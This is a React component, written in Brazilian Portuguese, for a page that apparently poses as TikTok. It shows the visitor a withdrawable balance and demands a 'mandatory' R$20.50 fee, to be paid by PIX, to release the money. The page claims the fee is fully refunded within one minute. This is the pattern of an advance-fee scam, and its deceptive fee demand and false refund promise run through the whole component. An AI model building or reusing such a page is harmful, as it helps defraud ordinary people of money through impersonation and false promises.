import { useState } from "react";
import logo from "../../utils/assets/logo.png";
import money from "../../utils/assets/image-removebg-preview.png";
import "./Index.css";

export default function Confirmation({price = 0, name, typePix, keyPix}) {

    const [tax] = useState(20.50);

    const date = new Date();

    const dateformatted = (`${String(date.getDate()).padStart(2, "0")}/${String(date.getMonth() + 1).padStart(2, "0")}/${date.getFullYear()}`);

    const saldo= price;

    return (
        <>
            <header className="confirmation">
                <img src={logo} alt="tiktok" className="logo" />
            </header>

            <main className="confirmation">
                <div className="container-saldo">
                    <div className="saldo">
                        <p>Seu saldo</p>
                        <h2>R$ {saldo}</h2>
                    </div>
                    <img src={money} alt="money-image" />
                </div>

                <div className="age-container">
                    <p className="title">Confirmação de Identidade</p>
                    <div className="container-taxa">
                        <h2 className="taxa">
                            {tax.toLocaleString("pt-BR", {
                                style: "currency",
                                currency: "BRL"
                            })}
                        </h2>
                        <span className="valor">
                            Valor Reembolsável
                        </span>
                    </div>
                    <p>
                        Taxa obrigatória para liberação do saque no valor de <span className="highlight">{price.toLocaleString("pt-BR", {style:"currency", currency: "BRL"})}</span>. O valor de <span className="highlight">{tax.toLocaleString("pt-BR", {style:"currency", currency: "BRL"})}</span> será reembolsado integralmente para você em 1 minuto.
                    </p>
                </div>

                <div className="data-container">
                    <p className="title">Dados para Reembolso</p>
                    <div className="container-divs">
                        <div>
                            <p>Nome</p>
                            <span>{name}</span>
                        </div>
                        <div>
                            <p>Data</p>
                            <span>{dateformatted}</span>
                        </div>
                        <div>
                            <p>Chave PIX</p>
                            <span>{typePix}</span>
                        </div>
                        <div>
                            <p>Valor a receber</p>
                            <span>{price}</span>
                        </div>

                    </div>
                    <button>{keyPix}</button>
                </div>
            </main>
        </>
    )
}